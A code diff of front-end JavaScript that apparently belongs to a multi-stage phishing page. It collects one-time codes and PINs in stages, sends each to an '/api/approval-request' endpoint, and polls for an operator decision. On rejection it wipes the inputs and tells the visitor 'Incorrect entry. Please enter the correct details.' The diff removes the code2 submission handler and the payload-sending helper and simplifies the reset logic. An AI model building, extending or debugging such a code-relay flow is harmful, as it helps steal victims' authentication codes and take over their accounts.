@@ -533,32 +533,7 @@ submitCode1Btn.addEventListener("click", async () => {
     });
   }
 });
-
-// Final step submission handler
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
-  try {
-    const response = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    return response.ok;
-  } catch (e) {
-    return false;
-  }
-}
-
+  
 // Polling core infrastructure engine
 function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
@@ -584,24 +559,14 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out old entries from the active stage text box or input container
-        const otpInput = document.getElementById(stage);
-        if (otpInput) otpInput.value = '';
-        
-        // Clear pin/box grids inside the current visible page container
+        // 2. Clear out old entries from the active page's input fields only
         const currentPage = document.getElementById(currentPageId);
         if (currentPage) {
-          const pinBoxes = currentPage.querySelectorAll('.boxes input, input[type="text"], input[type="password"]');
-          pinBoxes.forEach(box => box.value = '');
+          const inputs = currentPage.querySelectorAll('input');
+          inputs.forEach(input => input.value = '');
         }
         
-        // 3. Reset the primary continue button for this specific stage back to its initial locked style state
-        // This targets 'submitCode2' for stage 'code2', 'submitCode1' for stage 'code1', etc.
-        const dynamicBtnId = 'submit' + stage.charAt(0).toUpperCase() + stage.slice(1);
-        const submitBtn = document.getElementById(dynamicBtnId);
-        if (submitBtn) submitBtn.disabled = true;
-
-        // 4. Alert user about the correction step without blocking the interface view
+        // 3. Alert user about the correction step without blocking the interface view
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
